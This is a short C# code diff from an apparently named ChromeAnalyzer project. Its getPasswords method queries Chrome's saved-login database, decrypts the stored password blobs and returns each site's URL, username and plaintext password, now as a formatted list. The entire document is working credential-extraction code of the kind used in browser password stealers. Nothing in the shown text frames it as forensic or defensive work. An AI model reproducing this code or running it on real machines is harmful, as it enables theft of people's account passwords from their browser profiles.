@@ -20,19 +20,19 @@ namespace ChromeAnalyzer {
             client = new SQLite.Client(location);
         }
 
-        public string getPasswords() {
+        public List<string> getPasswords() {
             if (queryResult == null) {
                 queryResult = client.select(QUERY);
                 WindowsBLOBDecipher.decipherQueryResultField("pass", queryResult);
             }
 
-            string s = "";
+            List<string> res = new List<string>();
             foreach (DataRow r in queryResult.Rows) {
                 string pass = System.Text.Encoding.Default.GetString((byte[])r["pass"]);
-                s += r["url"] + " -> " + r["username"] + " : " + pass + "\r\n";
+                res.Add("PASSWORD FROM: " + r["url"] + "\r\n\tUSERNAME: " + r["username"] + "\r\n\tPASSWORD: " + pass);
             }
 
-            return s;
+            return res;
         }
     }
 }
